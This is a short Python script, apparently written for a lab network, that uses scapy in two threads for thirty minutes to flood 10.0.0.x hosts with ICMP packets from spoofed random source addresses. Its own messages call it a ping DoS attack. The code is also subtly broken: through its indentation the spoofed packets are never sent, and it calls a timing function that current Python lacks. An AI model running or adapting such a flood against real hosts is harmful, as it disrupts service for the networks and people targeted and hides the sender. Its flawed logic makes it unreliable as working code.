# -*- coding: utf-8 -*-
from threading import Thread
from random import randint
import time
from scapy.all import *

"""
    ping fake dst with random dst_ip using fake source
"""

def random_src_ip():
    ip_part1 = randint(1, 255)
    ip_part2 = randint(1, 255)
    ip_part3 = randint(1, 255)
    ip_part4 = randint(1, 255)
    return str(ip_part1) + "." + str(ip_part2) + "." + str(ip_part3) + "." + str(ip_part4)

def random_dst_ip(host_num):
    ip_part4 = randint(host_num+1, 255)
    return "10.0.0." + str(ip_part4)

def ping_sendone(host, random_source=True):
    id_ip = randint(1, 65535)
    id_ping = randint(1, 65535)
    seq_ping = randint(1, 65535)
    if random_source == True:
        source_ip = random_src_ip()
        packet = IP(src=source_ip, dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
    else:
        packet = IP(dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
        ping = send(packet, verbose=False)

def ping(host_num, running_time, random_source=True):
    start_time = time.clock()
    end_time = time.clock()
    ping_packet = 0
    while end_time - start_time < running_time:
        host = random_dst_ip(host_num)
        if random_source == True:
            ping_sendone(host)
        else:
            ping_sendone(host, random_source=False)
        ping_packet += 1
        print("attacked host:%s, and send %d packets." % (host,ping_packet))
        end_time = time.clock()

if __name__ == '__main__':
    host_num = 15
    t_ping1 = Thread(target=ping, args=(host_num, 1800,))
    t_ping2 = Thread(target=ping, args=(host_num, 1800,))
    print("starting ping attack.")
    t_ping1.start()
    t_ping2.start()

    if not (t_ping1.is_alive() and t_ping2.is_alive()):
        print("ping dos attact is over.")
